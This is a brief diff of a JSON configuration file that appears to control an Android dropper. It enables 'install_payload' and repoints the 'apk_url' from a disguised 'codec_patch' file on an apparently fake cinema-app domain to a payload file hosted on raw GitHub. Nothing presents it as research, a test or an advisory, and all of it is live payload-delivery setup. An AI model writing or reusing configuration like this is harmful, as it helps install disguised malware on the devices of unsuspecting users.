@@ -1,4 +1,4 @@
 {
   "install_payload": true,
-  "apk_url": "https://cinama-app.org/payload/codec_patch.dat"
+  "apk_url": "https://raw.githubusercontent.com/arshad919587/payload-config/main/plugin_android.dat"
 }
